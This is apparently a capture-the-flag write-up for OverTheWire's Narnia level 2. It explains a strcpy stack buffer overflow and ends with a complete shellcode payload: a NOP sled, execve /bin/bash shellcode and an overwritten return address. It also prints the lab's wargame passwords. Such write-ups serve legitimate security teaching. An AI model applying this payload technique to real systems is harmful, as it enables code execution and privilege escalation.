# Level 2 -> Level 3
ssh narnia2@narnia.labs.overthewire.org -p 2226  
Pass: Zzb6MIyceT  
An initial run of the bianry shows the following:   
<img width="626" alt="Screen Shot 2024-01-15 at 6 03 28 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/b6f27327-3024-4151-9403-e7983bd95840">

Looking at the C source file we can see that this program takes a command line argument and checks to see if one is provided or not  
if no command line argument is provided it prints the line "Usage: %s argument\n", argv[0]);”  
if there is a command line argument and then the program copies the argument to a character array named buf that is allocated 128 bytes and then prints the contents of buf.  
To pass a command line argument in C we simply have to run the program like so  
$ ./narnia2 hello  
When we do this we see the following output:  
<img width="627" alt="Screen Shot 2024-01-15 at 6 05 08 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/1956f366-309f-41fc-a7ab-a780de18e5f5">

We now know that we are successfully passing a command line argument to the program because we are not seeing the same error message as before.  
We also see that there is a buffer overflow vulnerability in this program because strcpy is a vulnerable function that does not perform bound checking and is copying our command line argument into “buf” which is only allocated 128 bytes.   
So we should be able to overwrite the saved parent return address (esp) and hijack the flow of execution and ultimately execute shellcode.  
The first step to doing this is to find the exact offset to esp.  
First we must generate a cyclic pattern. A cyclic pattern is a sequence of characters that has a distinct pattern so that when we see the value stored in esp we can take the first four bytes of that value and know the exact offset to overwrite esp.   
We can generate a large cyclic like so:  
<img width="624" alt="Screen Shot 2024-01-15 at 6 06 12 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/28b67e59-9de9-414a-a9d7-fa5b842f8752">

Now we can send this large cyclic to the program and use a debugger (pwndbg) to analyze the value stored in esp and calculate the offset.  
We can load the binary into the debugger using the following command:  
$ pwndbg ./narnia2  
The rest is shown below:  
<img width="626" alt="Screen Shot 2024-01-15 at 6 06 44 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/8b8fc85c-6254-4ca6-b17f-6a28f9c0ed53">

From this we see that the offset is 132. 
With this information we can begin to develop our exploit.

First we need to find the address we want to jump to where we will put a NOP sled to slide into our shellcode and execute it.  
To do this we can use gdb to send 132 ‘A’s to the program and see at which memory addresses our input is landing.  
Using the following commands we can load the binary into gdb and achieve this goal:  
$ gdb ./narnia2   
(gdb) break main  
(gdb) r $(perl -e 'print "\x41"x132 . "\x42\x42\x42\x42";')  
(gdb) c  
(gdb) x/200x $esp  
In which we then see the following:  
<img width="625" alt="Screen Shot 2024-01-15 at 6 21 16 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/da7bf5b1-7431-4d90-b14a-32c32b008c5d">

We pick a memory address early on when we start seeing our A’s (0x41). This shows where our input starts landing. For this instance I pick 0xffffd710.   
We then need to find shellcode that we want to execute. For this challenge I am using shellcode from the shellstorm repository on github. A link to the exact shellcode I used is below:  
https://github.com/7feilee/shellcode/blob/master/Linux/x86/execve(-bin-bash%2C_%5B-bin-sh%2C_-p%5D%2C_NULL).c  
Now we can begin to develop our final exploit.  
First we must determine the length of our shellcode so we can adjust our NOP padding appropriately.  
To do this we can use python shown below:  
<img width="625" alt="Screen Shot 2024-01-15 at 6 21 54 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/6035e933-c0df-4b74-83e6-338b48a856a1">

From this we see that our shellcode is 33 bytes long.  
Now that we have all of the pieces necessary we can craft our exploit.  
We want to craft our exploit in the following format:  
(NOP sled) -> (Shellcode) -> (Memory Address)  
The final payload is:  
./narnia2 $(perl -e 'print "\x90"x(132-33) . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "\x10\xd7\xff\xff";')  
Running this we see the following:  
<img width="628" alt="Screen Shot 2024-01-15 at 6 22 34 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/d3d98401-b609-46fd-9bd2-334cf6e4edd2">

Pass: 8SyQ2wyEDU






